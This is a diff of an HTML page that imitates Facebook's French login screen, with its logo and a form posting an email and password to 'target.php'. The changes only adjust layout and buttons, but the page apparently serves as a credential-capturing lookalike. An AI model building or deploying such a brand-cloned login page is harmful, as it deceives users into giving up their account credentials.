@@ -8,10 +8,10 @@
   <body>
     <div class="header">
       <img src="img/facebook_logo.png" alt="facebook_logo" class="logo">
-      <button type="button" name="create_account" id="create_account">Créer un compte</button>
+      <button type="button" name="create_account" class="create_account">Créer un compte</button>
     </div>
     <div class="connection_window">
-      <p class="connect">Se connecter à Facebook</p>
+      <p class="connect_message">Se connecter à Facebook</p>
       <form class="connection_form" action="target.php" method="post">
         <p>
           <input type="text" name="usnme" placeholder="Adresse e-mail ou numéro de tél.">
@@ -19,8 +19,13 @@
         <p>
           <input type="password" name="psswd" placeholder="Mot de passe">
         </p>
-        <button type="button" name="connection_button" id="connection_button">Connexion</button>
       </form>
+      <button type="button" name="connection_button" id="connection_button">Connexion</button>
+      <p class="forgot_info"><a href="#">Informations de compte oubliées ?</a></p>
+      <div class="options">
+        <p>ou</p>
+      </div>
+      <button type="button" name="create_account" class="create_account" id="bottom_button">Créer un compte</button>
     </div>
     <script type="text/javascript" src="js/main.js"></script>
   </body>
